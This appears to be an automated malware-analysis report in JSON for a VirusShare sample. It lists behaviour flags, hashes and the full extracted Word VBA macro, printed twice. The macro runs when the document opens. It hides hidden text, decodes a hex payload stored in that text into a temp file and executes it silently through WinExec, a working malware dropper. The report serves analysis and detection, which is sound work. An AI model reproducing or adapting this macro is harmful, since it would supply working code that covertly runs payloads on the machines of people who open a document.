{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Binary": "May read or write a binary file",
            "Call": "May call a DLL using Excel 4 Macros",
            "Document_Open": "Runs when the Word or Publisher document is opened",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Lib": "May run code from a DLL",
            "Open": "May open a file",
            "Put": "May write to a file",
            "Write": "May write to a file"
        },
        "macro": "Private Declare Sub WinExec Lib \"Kernel32\" (ByVal File As String, ByVal CmdShow As Long)\nPrivate Sub Document_Open()\nMacro0\nEnd Sub\nSub Macro0()\n                                                                                           \nDim ReadData, Data, TempPath As String\nDim Pos As Long\nDim DataByte As Byte\n                                                                                           \nActiveDocument.ActiveWindow.View.ShowAll = False\nActiveDocument.ActiveWindow.View.ShowHiddenText = False\n                                                                                           \nSet TextRange = ActiveDocument.Content\nTextRange.TextRetrievalMode.IncludeHiddenText = True\n                                                                                           \nData = TextRange.Text\n                                                                                           \nTextRange.Find.ClearFormatting\nTextRange.Find.Font.Hidden = True\nTextRange.Find.Replacement.ClearFormatting\nWith TextRange.Find\n    .Text = \"\"\n    .Replacement.Text = \" \"\n    .Forward = True\n    .Wrap = wdFindContinue\n    .Format = True\n    .MatchCase = False\n    .MatchWholeWord = False\n    .MatchWildcards = False\n    .MatchSoundsLike = False\n    .MatchAllWordForms = False\nEnd With\nTextRange.Find.Execute Replace:=wdReplaceAll\n                                                                                           \nReadData = \"START_CODE\"\nPos = InStr(TextRange.Text, ReadData)\nPos = InStr(Data, ReadData)\nData = Mid(Data, Pos + Len(ReadData))\nPos = InStr(Data, \"END_CODE\")\nData = Left(Data, Pos - 1)\n                                                                                           \nTempPath = Options.DefaultFilePath(wdTempFilePath) + \"\\\"\n                                                                                           \nOpen TempPath + \"Docs_2.tmp\" For Binary Access Write As #1\nFor i = 1 To Len(Data) Step 2\n  DataByte = Val(\"&H\" + Mid(Data, i, 2))\n  Put #1, , DataByte\nNext i\nClose #1\n                                                                                           \nCall WinExec(TempPath + \"Docs_2.tmp\", 0)\nActiveDocument.AttachedTemplate = NormalTemplates\nEnd Sub\n"
    },
    "filename": "VirusShare_1bbde6485ab38898ac96c58626c9746d",
    "filesize": 2567,
    "filetype": "ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "1bbde6485ab38898ac96c58626c9746d",
        "sha1": "3ec20f59a3056dcc3eb3d8866118efd98256671c",
        "sha256": "b2ae67988ed7206664422e5297742a9f4771ffdbfbc5846cb52b447fe18bc123"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "Attribute VB_Name = \"ThisDocument\"",
            "Attribute VB_Base = \"0{00020906-0000-0000-C000-000000000046}\"",
            "Attribute VB_GlobalNameSpace = False",
            "Attribute VB_Creatable = False",
            "Attribute VB_PredeclaredId = True",
            "Attribute VB_Exposed = True",
            "Attribute VB_TemplateDerived = False",
            "Attribute VB_Customizable = True",
            "Private Declare Sub WinExec Lib \"Kernel32\" (ByVal File As String, ByVal CmdShow As Long)",
            "Private Sub Document_Open()",
            "Macro0",
            "End Sub",
            "Sub Macro0()",
            "                                                                                           ",
            "Dim ReadData, Data, TempPath As String",
            "Dim Pos As Long",
            "Dim DataByte As Byte",
            "                                                                                           ",
            "ActiveDocument.ActiveWindow.View.ShowAll = False",
            "ActiveDocument.ActiveWindow.View.ShowHiddenText = False",
            "                                                                                           ",
            "Set TextRange = ActiveDocument.Content",
            "TextRange.TextRetrievalMode.IncludeHiddenText = True",
            "                                                                                           ",
            "Data = TextRange.Text",
            "                                                                                           ",
            "TextRange.Find.ClearFormatting",
            "TextRange.Find.Font.Hidden = True",
            "TextRange.Find.Replacement.ClearFormatting",
            "With TextRange.Find",
            "    .Text = \"\"",
            "    .Replacement.Text = \" \"",
            "    .Forward = True",
            "    .Wrap = wdFindContinue",
            "    .Format = True",
            "    .MatchCase = False",
            "    .MatchWholeWord = False",
            "    .MatchWildcards = False",
            "    .MatchSoundsLike = False",
            "    .MatchAllWordForms = False",
            "End With",
            "TextRange.Find.Execute Replace:=wdReplaceAll",
            "                                                                                           ",
            "ReadData = \"START_CODE\"",
            "Pos = InStr(TextRange.Text, ReadData)",
            "Pos = InStr(Data, ReadData)",
            "Data = Mid(Data, Pos + Len(ReadData))",
            "Pos = InStr(Data, \"END_CODE\")",
            "Data = Left(Data, Pos - 1)",
            "                                                                                           ",
            "TempPath = Options.DefaultFilePath(wdTempFilePath) + \"\\\"",
            "                                                                                           ",
            "Open TempPath + \"Docs_2.tmp\" For Binary Access Write As #1",
            "For i = 1 To Len(Data) Step 2",
            "  DataByte = Val(\"&H\" + Mid(Data, i, 2))",
            "  Put #1, , DataByte",
            "Next i",
            "Close #1",
            "                                                                                           ",
            "Call WinExec(TempPath + \"Docs_2.tmp\", 0)",
            "ActiveDocument.AttachedTemplate = NormalTemplates",
            "End Sub"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.302708",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
